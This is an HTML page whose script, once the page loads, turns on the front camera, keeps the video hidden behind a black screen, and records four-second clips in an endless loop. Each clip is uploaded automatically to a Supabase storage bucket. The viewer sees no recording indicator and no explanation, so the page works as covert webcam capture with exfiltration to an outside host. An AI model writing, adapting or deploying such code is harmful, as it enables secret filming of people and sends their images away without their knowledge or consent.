<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Front Camera Recorder & Upload</title>
  <style>
    body {
      margin: 0;
      background: black;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    video { display: none; }
  </style>
</head>
<body>
  <video id="camera" autoplay muted></video>
  <script type="module">
    import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'

    // Supabase setup
    const supabaseUrl = 'https://eizhtvtchspiefxutzlg.supabase.co'
    const supabaseKey = '<YOUR_ANON_OR_SERVICE_KEY>' // Replace with a secure key or signed upload URL
    const supabase = createClient(supabaseUrl, supabaseKey)

    async function recordAndUpload() {
      try {
        // Request front camera
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        })

        const video = document.getElementById('camera')
        video.srcObject = stream

        async function recordChunk() {
          const mediaRecorder = new MediaRecorder(stream)
          let chunks = []

          mediaRecorder.ondataavailable = e => {
            if (e.data.size > 0) chunks.push(e.data)
          }

          mediaRecorder.onstop = async () => {
            const blob = new Blob(chunks, { type: 'video/webm' })
            chunks = []

            const filename = `recording_${Date.now()}.webm`

            const { data, error } = await supabase
              .storage
              .from('recordings')
              .upload(filename, blob, { cacheControl: '3600', upsert: true })

            if (error) console.error('Upload error:', error)
            else console.log('Uploaded:', data.path)

            // Start next recording automatically
            setTimeout(recordChunk, 100) // slight delay to prevent overlap
          }

          mediaRecorder.start()
          setTimeout(() => mediaRecorder.stop(), 4000) // 4-second chunks
        }

        // Start first recording chunk
        recordChunk()

      } catch (err) {
        console.error('Camera access error:', err)
      }
    }

    recordAndUpload()
  </script>
</body>
</html>
